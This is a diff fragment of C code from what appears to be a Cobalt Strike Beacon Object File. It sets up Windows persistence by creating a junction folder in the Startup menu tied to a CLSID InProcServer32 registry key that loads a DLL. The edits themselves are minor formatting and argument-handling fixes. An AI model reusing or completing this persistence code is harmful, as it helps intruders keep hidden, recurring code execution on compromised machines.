@@ -473,13 +473,13 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 		BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
 		return FALSE;
 	}
+
+
 	MSVCRT$wcscpy(startupPath, pknownStartupPath);
 	MSVCRT$wcscat(startupPath, L"\\Programs\\Accessories\\");
 	MSVCRT$wcscat(startupPath, folderName);
 
 	MSVCRT$wcscat(dllPath, L"\0");
-
-
 
 	if (clean == 0)
 	{
@@ -560,18 +560,18 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 
 		if (success)
 		{
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Key Created Software\\Classes\\CLSID\\%ls\\InProcServer32", uidstr);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Key Created Software\\Classes\\CLSID\\%ls\\InProcServer32\n", uidstr);
 
 			//Add our junction folder
 			success = KERNEL32$CreateDirectoryW(startupPath, NULL);
 			if (!success)
 			{
 
-				BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder");
+				BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder\n");
 				success = FALSE;
 
 			}
-			BeaconPrintf(CALLBACK_OUTPUT, "[*]Created File %ls", startupPath);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*]Created File %ls\n", startupPath);
 			
 
 		}
@@ -802,7 +802,10 @@ void go(char* args, int length) {
 
 #endif
 #ifdef JUNCTION
-	clsid = (wchar_t*)BeaconDataExtract(&parser, &szClsid);
+	if(arg == 1)
+	{
+		clsid = (wchar_t*)BeaconDataExtract(&parser, &szClsid);
+	}
 
 	if (!JunctionFolder(arg, regName, dllName, clsid))
 	{
